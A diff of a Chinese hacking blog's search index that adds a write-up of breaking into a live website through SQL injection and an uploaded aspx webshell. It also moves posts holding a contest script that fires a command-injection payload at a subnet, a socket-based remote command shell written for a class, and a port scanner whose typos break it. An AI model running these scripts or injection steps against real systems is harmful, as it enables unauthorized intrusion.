@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>Mark-once-WebShell_01</title>
+      <link href="/2020/04/10/takeshell-01/"/>
+      <url>/2020/04/10/takeshell-01/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x01-起因🏴">0x01 起因🏴</h1><p>在做SRC活动的时候。扫描到一个 网站源码备份的网站，于是就打算进一步渗透。看看能不能拿SHELL</p><h1 id="0x02-网站SQL注入">0x02 网站SQL注入</h1><p>代码审计功底不太熟，就简单分析了一下文件内容。</p><p>知道了后台管理是/**system/下。然后就去网站看看能不能发现其他的漏洞</p><p><img src="image1.jpeg" alt="image1"></p><p>先走个流程信息收集下。</p><p><img src="E:%5CWeb%5CphpStudy16%5Cblog%5Cblg%5Csource_posts%5Ctakeshell-01%5Cimage3.jpeg" alt="image3"><img src="image2-1586436949788.jpeg" alt="image2"></p><p>惊了。Iis8.5 惹不起惹不起。</p><p>在一个地方找到了一个SQL注入</p><p><img src="image4.jpeg" alt="image4"></p><p><img src="image5.jpeg" alt="image5"></p><p>得劲🔥</p><p><img src="image6.jpeg" alt="image6"></p><p>发现sqlmap跑不出 密码❔于是 我上手工了</p><p><img src="image7.jpeg" alt="image7"></p><p>🖤得嘞。。直接扔进SOMD5里解密。</p><p>登录后台看看</p><p><img src="image8.jpeg" alt="image8"></p><p><img src="image9.jpeg" alt="image9"></p><p>。。。</p><p>。。。</p><p>。。。</p><p>找了一些。能上传的地方，但是都失败了。经验不足不太会。😩</p><p>正思考咋办的时候。突然灵光一闪🌞,咱们不是还有SQL注入嘛。还是MSSQL的数据库</p><p>直接上OS-SHELL</p><h1 id="0x03-WEBSHELL-🌄">0x03 WEBSHELL 🌄</h1><p><img src="image10.jpeg" alt="image10"></p><p>权限有点低嗷。🉑</p><p>上传一句话aspx小马</p><p><img src="image11.jpeg" alt="image11"></p><p><img src="image12.jpeg" alt="image12"></p><p><img src="image13.jpeg" alt="image13"></p><p>百度云的主机，惹不起</p><p>。。</p><p>。。</p><p>。。</p><p>到这里我也就不继续深究了。该删木马的都删了</p><p>本人菜鸟经验不足。提权那些。240个补丁，提不上。也没python环境，</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> note </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MSSQL_Blind_Injection</title>
       <link href="/2020/02/24/MSSQL%E7%9B%B2%E6%B3%A8/"/>
       <url>/2020/02/24/MSSQL%E7%9B%B2%E6%B3%A8/</url>
@@ -163,11 +182,11 @@
     
     
     <entry>
-      <title>【Pwn】学习笔记第零期:开端</title>
-      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/"/>
-      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/</url>
+      <title>【Pwn】学习笔记第一期:栈知识</title>
+      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/"/>
+      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！</p><h1 id="0x01-需要具备的知识">0x01 需要具备的知识</h1><p>1.扎实的C基础<br>2.基本DS：链表、队列、栈<br>3.基本linux配置与命令<br>4.会汇编更好，不会的话现学几个常用的也可以救急。</p><h1 id="0x02-环境搭建">0x02 环境搭建</h1><p>使用的系统: ubuntu19</p><p>工具: python - pwntools</p><p>​  pwndbg</p><p>​  ida</p><p>​  gcc-multilib</p><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-需要具备的知识">0x00 需要具备的知识</h1><h3 id="编译程序的内存分配">编译程序的内存分配</h3><h4 id="栈区-stack">栈区 (stack)</h4><p>函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。</p><h4 id="堆区-heap">堆区 (heap)</h4><p>一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。</p><h4 id="全局区-静态区static">全局区(静态区static)</h4><p>存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。</p><h4 id="常量区-文字常量区">常量区(文字常量区)</h4><p>存放常量字符串，程序结束后有系统释放。</p><h4 id="代码区">代码区</h4><p>存放函数体（类成员函数和全局区）的二进制代码。</p><h1 id="0x01-堆栈-stack-知识">0x01 堆栈(stack)知识</h1><p><img src="%E5%A0%86%E6%A0%88.jpg" alt="堆栈"></p><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -188,11 +207,11 @@
     
     
     <entry>
-      <title>【Pwn】学习笔记第一期:栈知识</title>
-      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/"/>
-      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-01/</url>
+      <title>【Pwn】学习笔记第零期:开端</title>
+      <link href="/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/"/>
+      <url>/2019/11/01/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-00/</url>
       
-        <content type="html"><![CDATA[<h1 id="0x00-需要具备的知识">0x00 需要具备的知识</h1><h3 id="编译程序的内存分配">编译程序的内存分配</h3><h4 id="栈区-stack">栈区 (stack)</h4><p>函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。</p><h4 id="堆区-heap">堆区 (heap)</h4><p>一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。</p><h4 id="全局区-静态区static">全局区(静态区static)</h4><p>存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。</p><h4 id="常量区-文字常量区">常量区(文字常量区)</h4><p>存放常量字符串，程序结束后有系统释放。</p><h4 id="代码区">代码区</h4><p>存放函数体（类成员函数和全局区）的二进制代码。</p><h1 id="0x01-堆栈-stack-知识">0x01 堆栈(stack)知识</h1><p><img src="%E5%A0%86%E6%A0%88.jpg" alt="堆栈"></p><p><strong>转载请标明出处</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="0x00-起因">0x00 起因</h1><p>有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！</p><h1 id="0x01-需要具备的知识">0x01 需要具备的知识</h1><p>1.扎实的C基础<br>2.基本DS：链表、队列、栈<br>3.基本linux配置与命令<br>4.会汇编更好，不会的话现学几个常用的也可以救急。</p><h1 id="0x02-环境搭建">0x02 环境搭建</h1><p>使用的系统: ubuntu19</p><p>工具: python - pwntools</p><p>​  pwndbg</p><p>​  ida</p><p>​  gcc-multilib</p><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
@@ -488,56 +507,6 @@
     
     
     <entry>
-      <title>【Python】:WebShell_urilb</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WebShell</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;<span class="string">"dir"</span>: <span class="string">"&amp;&amp; type flag.txt"</span>&#125;</span><br><span class="line">    url = <span class="string">"http://192.168.123."</span>+str(i)+<span class="string">"/DirCtrl.php"</span></span><br><span class="line">    data_string=urllib.parse.urlencode(data)</span><br><span class="line">    new_url=url+<span class="string">"?"</span>+data_string</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        send = urllib.request.urlopen(new_url,timeout=<span class="number">1</span>)</span><br><span class="line">        print(send.read().decode(<span class="string">"utf8"</span>,<span class="string">"ignore"</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    t = threading.Thread(target=WebShell, args=(i, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>【Python】:端口扫描</title>
-      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
-      <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
-      
-        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>在实训室无聊的时候，随手写了一下端口扫描的Python脚本.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">file=open(<span class="string">"port.txt"</span>,<span class="string">'w+'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portscan</span><span class="params">(port)</span>:</span></span><br><span class="line">    host=<span class="string">'192.168.174.1'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        conn=s.connect_ex((host,port))</span><br><span class="line">        <span class="keyword">if</span> conn ==<span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"HOST &gt; &#123;&#125; : OPEN : &#123;&#125;"</span>.format(host,post))</span><br><span class="line">            file.write(host+<span class="string">":"</span>+str(post)+<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    excpet:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">    t=threading.Thread(target=portscan, args=(port, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Python </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Python </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>【Python】:Web_Dirs_Scnnaer</title>
       <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/"/>
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/</url>
@@ -568,6 +537,56 @@
       <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/</url>
       
         <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>为了给学弟上公开课刻意写了一个远控脚本，虽然不这么行xD</p><ul><li><strong>Server:</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> data, s</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">"等待连接中……"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn,addr = s.accept()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            print(<span class="string">'收到命令'</span>)</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">            cmd = os.popen(data.decode())</span><br><span class="line">            os_result = cmd.read()</span><br><span class="line">            conn.sendall(os_result.encode(<span class="string">'utf8'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><ul><li><strong>Client:</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  socket</span><br><span class="line"></span><br><span class="line">ServerIP=(<span class="string">'127.0.0.1'</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,<span class="number">0</span>)</span><br><span class="line">    s.connect(ServerIP)</span><br><span class="line">    print(<span class="string">'[+]连接成功'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">'[-]服务器无响应'</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data=input(<span class="string">'[CMD]&gt;&gt;'</span>)</span><br><span class="line">    s.sendto(bytes(data,encoding=<span class="string">'utf8'</span>),ServerIP)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'[+]回显成功'</span>)</span><br><span class="line">    print(data.decode())</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>【Python】:WebShell_urilb</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p><strong>使用urlilb模块</strong></p><p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WebShell</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;<span class="string">"dir"</span>: <span class="string">"&amp;&amp; type flag.txt"</span>&#125;</span><br><span class="line">    url = <span class="string">"http://192.168.123."</span>+str(i)+<span class="string">"/DirCtrl.php"</span></span><br><span class="line">    data_string=urllib.parse.urlencode(data)</span><br><span class="line">    new_url=url+<span class="string">"?"</span>+data_string</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        send = urllib.request.urlopen(new_url,timeout=<span class="number">1</span>)</span><br><span class="line">        print(send.read().decode(<span class="string">"utf8"</span>,<span class="string">"ignore"</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    t = threading.Thread(target=WebShell, args=(i, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Python </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>【Python】:端口扫描</title>
+      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
+      <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
+      
+        <content type="html"><![CDATA[<h1 id="0x00-介绍">0x00 介绍</h1><p>在实训室无聊的时候，随手写了一下端口扫描的Python脚本.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">file=open(<span class="string">"port.txt"</span>,<span class="string">'w+'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">portscan</span><span class="params">(port)</span>:</span></span><br><span class="line">    host=<span class="string">'192.168.174.1'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        conn=s.connect_ex((host,port))</span><br><span class="line">        <span class="keyword">if</span> conn ==<span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"HOST &gt; &#123;&#125; : OPEN : &#123;&#125;"</span>.format(host,post))</span><br><span class="line">            file.write(host+<span class="string">":"</span>+str(post)+<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    excpet:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">    t=threading.Thread(target=portscan, args=(port, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>转载请标明出处</strong></p>]]></content>
       
       
       <categories>
